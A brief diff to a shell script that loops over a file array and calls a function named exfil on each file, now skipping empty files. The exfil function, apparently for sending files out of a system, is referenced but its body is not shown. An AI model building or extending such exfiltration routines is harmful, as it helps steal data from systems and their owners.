@@ -27,11 +27,14 @@ exfil() {
 # loop thru the array of files!
 for file in "${file_array[@]}"
 do
-    if [ -f $file ]
+    size=$(wc -c <"$file")
+    if [ $size -gt 0 ]
     then
-      exfil $file 
+    if [ -f $file ]
+      then
+        exfil $file 
+      fi
     fi
-
 done
 
 
